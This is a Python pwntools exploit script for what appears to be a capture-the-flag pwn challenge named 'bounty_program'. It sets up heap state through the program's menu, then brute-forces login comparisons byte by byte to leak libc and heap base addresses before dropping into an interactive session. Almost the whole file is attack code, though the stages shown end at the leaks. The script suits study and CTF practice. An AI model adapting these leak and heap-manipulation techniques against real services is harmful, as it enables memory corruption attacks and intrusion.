from pwn import *


def wrapper(name,value):
    r.sendlineafter(b'Name:',name)
    r.sendlineafter(b'Value:',value)
def login(username, password):
    r.sendlineafter(b'Your choice: ',b'1')
    r.sendafter(b'Username:',username)
    r.sendafter(b'Password:',password)

def logout():
   r.sendlineafter(b'Your choice: ',b'7') 

def register(username,password,contact) :
    r.sendlineafter(b'Your choice: ',b'2')
    r.sendafter(b'Username:',username)
    r.sendafter(b'Password:',password)
    r.sendafter(b'Contact:',contact)

def remove_user():
    r.sendlineafter(b'Your choice: ',b'5')

def add_new_product(name,company,comment):
    r.sendlineafter(b'Your choice: ',b'1')
    r.sendafter(b'Name of Product:',name)
    r.sendafter(b'Company:',company)
    r.sendafter(b'Comment:',comment)

def add_new_type(size, bug_type,price):
    r.sendlineafter(b'Your choice: ',b'2')
    r.sendafter(b'Size:',str(size).encode())
    r.sendafter(b'Type:', bug_type)
    r.sendafter(b'Price:',str(price).encode())

def submit_bug_report(product_id, bug_type, title, bug_id, length, descripton):
    r.sendlineafter(b'Your choice: ',b'3')
    r.sendafter(b'Product ID:',str(product_id).encode())
    r.sendafter(b'Type:',bug_type)
    r.sendafter(b'Title:',title)
    r.sendafter(b'ID:',str(bug_id).encode())
    r.sendafter(b'Length of descripton:',str(length).encode())
    r.sendafter(b'Descripton:',descripton)

def delete_bug_report(product_id, bug_id):
    r.sendlineafter(b'Your choice: ',b'8')
    r.sendafter(b'Product ID:',str(product_id).encode())
    r.sendafter(b'Bug ID:',str(bug_id).encode())

def change_password(new_password) :
    r.sendlineafter(b'Your choice: ',b'2')
    r.sendafter(b'password:',new_password)



def leak_libc():
    libc = b'\x7f'
    for i in range(4):
        padding = b'a' * (4 - i)
        register(padding+b'\x00', padding, b'123')
        for j in range(255):
            guess_bytes = (j).to_bytes(1,'little')
            guess = padding + guess_bytes + libc
            login(padding+b'\x00',guess)
            message = r.recvuntil(b'$$$$$$$$$$$$$$$$$$$$$$$$$')
            if b'Invalid' not in message :
                logout()
                r.wait(0.1)            
                libc = guess_bytes + libc
                print(libc)
                break

    libc_addr = u64(b'\x00' + libc + b'\x00'*2) - 0x1ecb00
    return libc_addr


def set_up_leak():
    register(b'5\x00',b'5\x00',b'231')
    login(b'5\x00', b'5\x00')
    logout()

    register(b'6\x00',b'6\x00',b'6\x00')
    login(b'6\x00', b'6\x00')
    remove_user()

    login(b'5\x00', b'5\x00')
    remove_user()

def leak_heap_base():
    set_up_leak()
    heap = b''
    for i in range(5):       
        padding = b'b' * (5 - i)
        register(padding+b'\x00', padding, b'123')

        # guess first \x56 or \x55
        if i == 0 :
            for j in range(0x55,0x57):
                guess_bytes = (j).to_bytes(1,'little')
                guess = padding + guess_bytes + heap
                login(padding+b'\x00',guess)
                message = r.recvuntil(b'$$$$$$$$$$$$$$$$$$$$$$$$$')
                if b'Invalid' not in message :
                    remove_user()
                    r.wait(0.1)            
                    heap = guess_bytes + heap
                    print(heap)
                    break
        else :
            for j in range(255):
                guess_bytes = (j).to_bytes(1,'little')
                guess = padding + guess_bytes + heap
                login(padding+b'\x00',guess)
                message = r.recvuntil(b'$$$$$$$$$$$$$$$$$$$$$$$$$')
                if b'Invalid' not in message :
                    remove_user()
                    r.wait(0.1)            
                    heap = guess_bytes + heap
                    print(heap)
                    break
    heap_addr = u64(b'\x00' + heap + b'\x00'*2) - 0xa00
    return heap_addr

#r = process("./B", env={"LD_PRELOAD" : "./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so"})
r = process('./bounty_program')
#r = remote('chall.pwnable.tw',10208)
#wrapper(b'123',b'123')

register(b'123',b'a'*0xf, b'a'*0xf)
login(b'123',b'a'*0xf)
r.sendlineafter(b'Your choice: ',b'1') # bounty

add_new_product(b'456',b'456',b'456')
submit_bug_report(0,b'RCE',b'ccccc',0,0x2000,b'a')
add_new_product(b'789',b'789',b'789')
delete_bug_report(0,0)

r.sendlineafter(b'Your choice: ',b'0') #return
logout() #logout

### leak libc 
libc_addr = leak_libc()
print(f'libc_addr : {hex(libc_addr)}')

### leak heap 
heap_addr = leak_heap_base() 
print(f'heap_addr : {hex(heap_addr)}')

r.interactive()
